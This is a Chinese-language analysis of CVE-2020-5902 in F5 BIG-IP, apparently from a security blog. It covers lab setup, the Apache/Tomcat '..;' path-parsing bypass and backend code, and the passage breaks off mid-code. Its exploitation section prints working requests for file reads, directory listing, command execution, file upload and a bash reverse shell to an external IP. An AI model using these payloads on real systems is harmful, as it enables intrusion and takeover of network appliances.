## 文章前言
近期关于CVE-2020-5902:F5 BIG-IP的EXP&POC满天飞，本篇文章则对该漏洞进行一个简单的剖析~
## 影响范围
  * BIG-IP = 15.1.0
  * BIG-IP = 15.0.0
  * BIG-IP 14.1.0 - 14.1.2
  * BIG-IP 13.1.0 - 13.1.3
  * BIG-IP 12.1.0 - 12.1.5
  * BIG-IP 11.6.1 - 11.6.5
## 漏洞类型
  * RCE
  * ReadFile
  * ListDirectory
  * Arbitrary File Upload
## 利用条件
  * 上述影响范围所列的F5 BIG-IP版本
  * 第一种EXP：在RCE以及反弹shell时需要近期有用户登录或者用户会话未过期
  * 第二种EXP: F5 BIG-IP未关闭Hysqldb(密码默认为空，而且在lib下的jar包中，不存在更改问题)
## 漏洞概述
F5 BIG-IP 是美国 F5 公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。  
2020年7月初，有安全研究人员公开披露F5 BIG-IP产品的流量管理用户页面
(TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞，并给出测试POC，攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java
代码执行，进而控制F5 BIG-IP 的全部功能，包括但不限于:
执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等，该漏洞影响控制面板，不影响数据面板。
## 漏洞复现
### 环境搭建
#### 虚拟机下载
首先去F5官网注册一个账号(PI:EMAIL/12345Qwert)，并登陆：  
之后进入下载页面，在这里我们下载v15.x系列的漏洞版本与修复版本进行分析测试，下载页面：  
下载存在漏洞的BIG-IP的ova文件：  
之后下载修复版本的BIG-IP的ova文件到本地  
#### 虚拟机搭建
将两个ova文件导入VMware Workstations中：  
启动之后会要求输入账号密码，BIG默认账号密码为root/default:  
成功登陆之后会要求我们重置密码，这个密码为Web页面的登陆密码(该密码要有一定的复杂度，这里使用kvqasdt!q1与kvqasdt!q2)需要记住：  
然后在命令行下输入"config"打开打开Configuration Utility工具来查看当前BIG-IP的IP地址信息：  
一会儿之后你会看到如下界面信息：  
之后点击"OK"，然后选择IPV4 IP地址：  
之后你会看到当前BIG-IP主机的IP地址信息(BIGIP-15.1.0.0)：  
BIGIP-15.1.0.4的IP地址：  
之后在浏览器中使用  
之后使用"admin/之前重置的密码"进行登录认证：  
之后还需要再重置一次登录密码，这里重置为hkn!2gQWsgk，另外一个重置为hkn!2gQWsgk1  
至此，我们已经拥有一个账号为admin/hkn!2gQWsgk的漏洞靶机，和一个账号为admin/hkn!2gQWsgk1的安全主机，下面我们进行简易测试~
## 漏洞利用
### 文件读取
POC:
    /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
执行结果：  
    /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/profile_base.conf
其它路径可以参考：
### 列目录项
POC:
    /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/
### 命令执行
方式一：指令别名方式  
Step 1:创建执行命令的模式，将list设置为bash的别名
    tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
Step2:向创建的文件中写入要执行的命令
    fileSave.jsp?fileName=/tmp/cmd&content=id
Step3:利用前面设置的list来执行文件中的命令  
在无用户登录的情况下：  
近期有用户登录的情况下：  
Step4:最后清空list  
方式二：tmsh命令语法  
除了使用上面这种通过alias将bash设置别名来实现命令执行的效果外，我们还可以使用BIG-IP的一些内置的命令，例如：
  * list auth user——查看所有用户
  * list auth user admin ——仅仅查看admin用户  
有人可能会好奇，为什么方式一中要将bash的别名设置为list，而这里也是tmsh内置的list指令呢？这是因为在WorkspaceUtils.java文件中对operation操作类型有检测，只允许create\delete\list\modify四种类型，这在漏洞分析部分有详细描述~
关于通过tmsh的list命令查看用户信息的描述可参考：  
###反弹shell  
在反弹shell时我们可以通过上述的RCE来实现，其中第二种方式可能并不适用，在这里我们要通过alias将bash设置别名为list之后实现反弹shell的操作，具体的操作流程如下：  
Step 1：首先，创建执行命令的模式，将list设置为bash
        tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
Step 2：创建包含反弹shell的命令并以文本文件形式保存（这里介绍bash方式的反弹shell的方式，其余的类似于perl、ruby等不再赘述）
        fileSave.jsp?fileName=/tmp/1.txt&content=bash+-i+>%26/dev/tcp/192.168.174.131/4444+0>%261
成功写入到/tmp/1.txt  
Step 3:反弹shell回来  
其余的例如nc，python都可以正常反弹shell，有兴趣的可自我尝试,下面是构造方式：  
nc  
Python:  
###文件上传
        /tmui/locallb/workspace/fileSave.jsp
    POST:
    fileName=/tmp/1.txt&content=CVE-2020-5902
之后通过文件读取来验证：  
可以看到成功上传文件/tmp/1.txt~
## 漏洞分析
造成该漏洞的原因主要是Tomcat对于含有特殊符号的URL解析特性导致的权限校验绕过，之后通过未授权访问相关路由信息导致的文件读取、文件写入以及tmsh命令执行等，下面我们从三个方面来看：中间件的URL解析差异性、请求处理追溯、后端代码逻辑
### 解析差异简介
在WEB架构服务中，我们经常会碰到Tomcat与Nginx，Apache这三个服务，我们在这里首先做一个区别：
  * Apache：HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上，其属于应用服务器。Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等，(Apche可以支持PHP，cgi(外部应用程序与Web服务器之间的接口)、perl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Apache转发给Tomcat处理。
  * Tomcat：Tomcat是应用(Java)服务器，它只是一个Servlet(JSP也翻译成Servlet)容器，可以认为是Apache的扩展，但是可以独立于Apache运行。
  * Nginx：Nginx是一个高性能的HTTP和反向代理服务器，同时也是一个IMAP/POP3/SMTP  
F5 BIG-IP采用的为Apache+Tomcat组合来处理JAVA应用，下面我们进入正式的话题！在这里我们以Orange在2018年的BlackHat的演讲文档中的一个类似的实例做介绍说明，在正常情况下我们访问login.getbynder.com时会要求我们先进行一次登录认证：
此时的服务器端的响应结果类似下图所示：
之后，我们通过在域名后直接添加"..;/x"并进行访问得到如下结果：
在fuzz过程中用到一下测试示例：
那么为什么会出现这种问题呢？是因为当Nginx以及Apache碰到"/..;/"时，他们会认为"/..;/"是一个目录，而Tomcat则很是无耐的表示"/..;/"应该是一个父级目录，需要向上递归一次：  
Nginx VS Tomcat:  
Apache VS Tomcat：  
在这里我们可以利用以上解析特性来绕过权限检测访问需要登录后才可以访问页面：  
其他的中间件解析差异对比效果如下  
请求URL:  
解析对比：  
回到我们的漏洞中，这里我们可以理解在F5 BIG-IP的后台服务器对收到了URL请求进行了两次的解析，第一次是httpd(Apache),
第二次是后一层的Java(tomcat)，当我们发起请求：  
当Apache在看见前半段是合法URL且是允许被访问的页面时，就把它交给了后面的第二层，Apache在这里完全把URL里面关键的/..;/
给无视了，此时做权限校验的只是前面的login.jsp而已~  
在URL在第二次被解析时，后面的Java(tomcat)会把"/..;/"理解为向上返回一层路径，此时,，/login.jsp/ 和 /..;/
会抵消掉，Tomcat看到的真正请求从  
变成了：  
之后去根据web.xml中的路由调用对应的类进行请求处理，关于解析差异性的更多细节与利用技巧可参考如下链接(值的细品)：  
### 请求处理追溯
首先我们从Web的配置文件/WEB-INF/web.xml看起，在这里我可以看到配置的Servlet的load-on-startup属性，该属性的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法)，在这个属性中的可选内容必须为一个整数，表明了这个servlet被加载的先后顺序，当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。当值为0或者大于0时，表示服务器在启动时就加载这个servlet，容器可以保证被标记为更小的整数的servlet比被标记为更大的整数的servlet更先被调用，还可以选择同样的load-on-start-up值来夹在servlets。  
在这里我们留意到首先是加载com.f5.controller.Log4jInit类，该类的主要作用是配置log日志的记录，我们继续向下看：  
之后我们发现了com.f5.controller.ControlServlet类同样配置了load-on-start-up属性，并指定了init()方法的参数信息：  
之后，我们使用jd-gui分析依赖/WEB-INF/lib/tmui.jar，根据目录项依次找到
com.f5.controller.ControlServlet的init方法：  
可以看到此处的init()方法首先是初始化了一些配置项，并根据配置项参数做相应的配置操作，在最后我们可以看到又调用了F5Controller类的init方法，并以之前的初始化值作为参数传递，我们继续跟进该Servlet类：  
从上图中可以看到，这里只是做了一些简单的初赋值操作，我们返回原先的ControlServlet类，之后可以看到调用了F5WeebController类的initMapping方法：  
之后跟进该类的intitleMapping方法，可以看到此处有转而调用了Mapping方法：  
之后继续跟进，可以看到在该方法中分别读取了/WEB-INF/xml/requestmappings.xml、/WEB-INF/xml/responsemappings.xml：  
/WEB-INF/xml/requestmappings.xml————请求地址handler映射(对应处理类方法)：  
/WEB-INF/xml/responsemappings.xml————响应地址handler映射(对应jsp文件)：  
之后继续返回com.f5.controller.ControlServlet，可以看到该类重新doGet方法与doPost方法，所以的请求都会经由这两种方法进行处理：  
而doPOST中直接转发请求到了doGet内：  
所以我们这里直接对doGet做一个简单的分析即可：  
在这里可以看到首先是判断请求的处理是否能够提供分配数据库的连接，如果连接方式是1则连接mysql，如果连接方式是0则连接hsqldb。  
之后我们继续向下分析，此时会实例化一个F5WebController类对象，并且将request等参数传递进去，之后跟进去发现除实例化操作外别无其他：  
返回源文件继续分析，之后会调用request.getRemoteUser()方法获取请求数据中的用户名信息，之后根据用户名信息是否为空做逻辑判断，当用户名为空会通过F5Properties.getAPPlicationString方法来为用户名赋值(应用名称)，如果添加一个请求属性"com.f5.corba.username"并为其赋值"username"，之后创建一个空的User对象实例，之后通过一个while循环来打印输出请求头信息，之后创建一个User示例并赋值给之前的空User示例user，然后判断用户的RoleId是否大于900，如果大于900则打印错误日志到控制台并直接返回(默认返回900)：  
同时会调用WebUtils.setPartitio进行一些赋值操作，具体如下：  
在最后会去调用controller.processWebRequest()方法并将指向结果赋值给requestForwarded，当返回的requestForwarded的值为true时会继续调用fail函数来输出错误信息，并清空buffer：  
之后跟进processWebRequest方法：  
在函数开头处的61行调用Mappings.getRequestByURL(this.request.getPathInfo())
方法来获取当前路由的requestMapping配置，我们跟进去会发现该方法会根据request.getPathInfo()
的Servlet路径返回相对应的Handler类名：  
之后我们继续下面的逻辑分析，可以看到之后初始化了currentUserLeve为900，并通过User.getUser()来获取用户信息，如果用户信息不为空则进入if语句中继续调用示例化后的user的getRoleID来重置currentUserlevel，之后再调用requestHandler.getAllowedLevels来设置allowedLevels，之后依据allowedLevels的值并通过if判断来判别当前用户是否有访问目标URL的权限，此处因为路由访问权限校验：  
User.haveAccessToAtLeastOneTargetLevel()
方法代码如下，可以看到此时会初始化一个Boolean变量的userHasAccess变量，并赋值为false，之后通过循环来比较当前用户的Role与要访问的目标URL所具备的Level(类似于权限)是否有匹配项，如果匹配则重置userHasAccess为true并返回，如果没有匹配项则返回初始化后userHasAccess的默认值，即False:  
完整的用户角色对照表如下所示：  
之后当有访问权限时则调根据/WEB-INF/web.xml 的路由调用对应的类进程处理：  
在这里也许会有人问，此时的请求流程中不是使用了权限校验吗？而且使用的是getPathinfo()这种较为安全的方法来获取(其他的请求方法的安全性问题可以参考：  
恶意请求：  
Apache解析：)  
Tomcat解析：)  
request.getPathInfo()：/tmui/login.jsp(获取原请求的中传递到Servlet的请求，在进行权限校验时对此路径的访问进行校验，login.jsp任意用户都可访问)  
上面的流程已经很清晰了，这里不再赘述，下面我们来看后端的代码是如何实现的，准确定位到相关的文件与请求处理函数~
### 后端代码处理处理
#### 文件读取
漏洞文件：tmui1\WEB-INF\classes\org\apache\jsp\tmui\locallb\workspace\fileRead_jsp.class  
文件分析：在漏洞文件fileRead_jsp.java程序中，我们可以看到对于一次文件读取请求首先会获取filename，之后根据传入的文件名称调用WorkspaceUtils.readFile()函数来读取文件，之后输出读取的结果
    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
            HttpSession session = null;
            JspWriter out = null;
            JspWriter _jspx_out = null;
            PageContext _jspx_page_context = null;
            try {
                response.setContentType("text/html");
                PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
                _jspx_page_context = pageContext;
                ServletContext application = pageContext.getServletContext();
                ServletConfig config = pageContext.getServletConfig();
                session = pageContext.getSession();